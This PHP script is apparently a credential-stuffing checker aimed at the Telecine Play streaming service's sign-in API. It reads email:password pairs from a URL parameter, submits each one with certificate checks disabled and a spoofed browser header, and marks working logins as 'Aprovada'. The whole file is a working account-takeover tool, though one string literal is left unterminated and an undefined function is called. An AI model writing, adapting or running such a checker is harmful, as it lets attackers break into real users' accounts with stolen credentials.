<?php

error_reporting(0);
function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];
$email = multiexplode(array(":", "|", ""), $lista)[0];
$senha = multiexplode(array(":", "|", ""), $lista)[1];


function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}


$ch = curl_init ();

curl_setopt ($ch,CURLOPT_URL,'https://www.telecineplay.com.br/api/authorization/sign-in-mpx');
curl_setopt ($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt ($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt  ($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt  ($ch,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt ($ch,CURLOPT_HTTPHEADER,arraY (
'Host: www.telecineplay.com.br',

'accept: application/json',


'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G600FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'content-type: application/json',



));
curl_setopt ($ch,CURLOPT_ENCODING,'gzip');



curl_setopt($ch,CURLOPT_POST,1);
curl_setopt ($ch,CURLOPT_POSTFIELDS,'{"username":"'. $email.'","password":"'. $senha.'","cookieType":"Persistent"}');

$exe = curl_exec ($ch);

$retorno = getstr ($exe,'"message":"','"');
if (strpos ($exe,'Usuário ou senha incorretos)!==false){
	echo "<span style ='background-color:red; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600'>Reprovada</span> <span style='color:red;'> EMAIL: $email SENHA:$senha  Retorno: Email ou senha incorreto</span>";
	xflush();
}else {
	echo"<br><span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);
	; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>Aprovada</span><span style='color:white'>  EMAIL: $email  SENHA:$senha </span><span class='label label-info' style='color: white'> </span> <span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);, whiteolor: white; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>#Central_Black</span>";
}

echo $retorno;


?>